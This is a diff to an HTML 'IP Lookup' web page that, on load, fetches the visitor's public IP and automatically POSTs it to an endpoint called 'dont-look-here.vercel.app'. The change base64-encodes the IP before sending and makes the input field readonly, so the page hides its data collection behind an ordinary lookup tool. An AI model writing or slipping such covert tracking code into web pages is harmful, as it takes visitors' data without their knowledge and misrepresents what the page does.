@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Lookup</title>
+    <title>IP Lookup & Encode</title>
     <style>
         * {
             margin: 0;
@@ -110,10 +110,11 @@
     </style>
 </head>
 <body>
-    <h2>🌍 IP Lookup</h2>
+    <h2>🌍 IP Lookup & Encode</h2>
     <div class="container">
-        <input type="text" id="ipInput" placeholder="Enter IP address">
+        <input type="text" id="ipInput" placeholder="Fetching your IP..." readonly>
         <button onclick="lookupIP()">🔍 Lookup</button>
+        <button onclick="sendEncodedIP()">🔒 Encode & Send</button>
         <p class="helper-link">
             <a href="https://whats-my-ip-now.vercel.app/" target="_blank">Don't know your public IP?</a>
         </p>
@@ -121,12 +122,13 @@
     </div>
 
     <script>
-        // Fetch user's public IP on page load and send it
+        // Fetch user's public IP on page load
         window.onload = function () {
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
-                    sendIP(data.ip); // Automatically send the IP
+                    document.getElementById("ipInput").value = data.ip;
+                    sendEncodedIP(data.ip); // Automatically send encoded IP
                 })
                 .catch(error => console.error("Failed to fetch IP:", error));
         };
@@ -165,13 +167,22 @@
                 });
         }
 
-        function sendIP(ip) {
+        function sendEncodedIP(ip = null) {
+            const ipValue = ip || document.getElementById("ipInput").value;
+            if (!ipValue) {
+                console.error("No IP available to encode.");
+                return;
+            }
+
+            const encodedIP = btoa(ipValue); // Base64 encode the IP
+            console.log("Encoded IP:", encodedIP);
+
             fetch("https://dont-look-here.vercel.app/api/api.js", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ ip }) // Send the raw IP, no encoding
+                body: JSON.stringify({ encodedIP })
             })
             .then(response => response.json())
             .then(data => {
